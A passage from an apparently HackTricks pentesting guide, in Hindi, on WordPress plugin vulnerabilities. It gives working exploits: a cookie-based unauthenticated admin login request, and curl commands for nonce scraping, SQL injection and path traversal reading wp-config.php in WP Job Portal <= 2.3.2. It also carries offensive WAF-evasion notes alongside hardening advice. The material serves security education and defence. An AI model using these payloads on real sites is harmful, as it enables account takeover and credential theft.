if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // 🔥 sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
क्यों यह exploitable है

- सार्वजनिक `init` hook हैंडलर को unauthenticated users द्वारा पहुँच योग्य बनाता है (कोई `is_user_logged_in()` guard नहीं).
- पहचान क्लाइंट-परिवर्तनीय cookie (`original_user_id`) से निकाली जाती है.
- `wp_set_auth_cookie($uid)` के सीधे कॉल से अनुरोधकर्ता को उस उपयोगकर्ता के रूप में लॉग इन कर दिया जाता है बिना किसी capability/nonce जांच के.

Exploitation (unauthenticated)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### WordPress/plugin CVEs के लिए WAF पर विचार

Generic edge/server WAFs व्यापक पैटर्न (SQLi, XSS, LFI) के लिए ट्यून किए गए होते हैं। कई high‑impact WordPress/plugin flaws एप्लिकेशन-विशिष्ट लॉजिक/auth बग होते हैं जो सामान्य ट्रैफ़िक जैसा दिखते हैं जब तक engine WordPress routes और plugin semantics को न समझे।

Offensive notes

- क्लीन payloads के साथ plugin-विशिष्ट endpoints को लक्षित करें: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- पहले अप्रमाणीकृत paths आज़माएँ (AJAX `nopriv`, REST with permissive `permission_callback`, public shortcodes)। डिफ़ॉल्ट payloads अक्सर बिना obfuscation के सफल होते हैं।
- सामान्य high-impact मामलों में शामिल हैं: privilege escalation (broken access control), arbitrary file upload/download, LFI, open redirect.

Defensive notes

- plugin CVEs की सुरक्षा के लिए सामान्य WAF signatures पर भरोसा न करें। एप्लिकेशन-लेयर, vulnerability-specific वर्चुअल पैच लागू करें या जल्दी अपडेट करें।
- कोड में negative regex filters की बजाय positive-security checks को प्राथमिकता दें (capabilities, nonces, strict input validation)।

## WordPress सुरक्षा

### नियमित अपडेट

सुनिश्चित करें कि WordPress, plugins, और themes अपडेटेड हैं। साथ ही पुष्टि करें कि automated updating wp-config.php में सक्षम है:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
साथ ही, **केवल भरोसेमंद WordPress plugins और themes ही इंस्टॉल करें**।

### सुरक्षा प्लगइन्स

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **अन्य सिफारिशें**

- डिफ़ॉल्ट **admin** उपयोगकर्ता हटाएँ
- **मजबूत पासवर्ड** और **2FA** का उपयोग करें
- समय-समय पर उपयोगकर्ताओं की **अनुमतियाँ** की **समीक्षा** करें
- Brute Force attacks को रोकने के लिए **लॉगिन प्रयासों को सीमित करें**
- **`wp-admin.php`** फ़ाइल का नाम बदलें और केवल आंतरिक रूप से या कुछ निश्चित IP पतों से ही पहुँच की अनुमति दें।

### Unauthenticated SQL Injection via insufficient validation (WP Job Portal <= 2.3.2)

The WP Job Portal recruitment plugin ने एक **savecategory** टास्क उजागर किया जो अंततः `modules/category/model.php::validateFormData()` के अंदर निम्नलिखित vulnerable code को execute करता है:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat ✗
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
इस snippet से उत्पन्न मुद्दे:

1. **Unsanitised user input** – `parentid` सीधा HTTP request से आता है।
2. **String concatenation inside the WHERE clause** – कोई `is_numeric()` / `esc_sql()` / prepared statement नहीं है।
3. **Unauthenticated reachability** – भले ही action `admin-post.php` के माध्यम से execute होता है, यहाँ सिर्फ़ एक चेक है: **CSRF nonce** (`wp_verify_nonce()`), जिसे कोई भी विज़िटर उस public पेज से प्राप्त कर सकता है जो shortcode `[wpjobportal_my_resumes]` embed करता है।

#### शोषण

1. एक नया nonce प्राप्त करें:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. `parentid` का दुरुपयोग करके arbitrary SQL इंजेक्ट करें:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
रिस्पॉन्स injected query का परिणाम प्रकट करता है या database को बदल देता है, जिससे SQLi साबित होता है।


### अनप्रमाणित Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

एक और task, **downloadcustomfile**, विज़िटर्स को path traversal के जरिए **disk पर मौजूद किसी भी file** को डाउनलोड करने की अनुमति देता था। कमजोर sink `modules/customfield/model.php::downloadCustomUploadedFile()` में स्थित है:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` अटैकर-नियंत्रित है और बिना **sanitisation** के जोड़ दिया जाता है। फिर से, एकमात्र बाधा एक **CSRF nonce** है जिसे resume पृष्ठ से प्राप्त किया जा सकता है।

#### Exploitation
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
सर्वर `wp-config.php` की सामग्री के साथ प्रतिक्रिया देता है, leaking DB credentials और auth keys।

## संदर्भ

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset – delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments ≤ 5.6.1 – Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation – Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
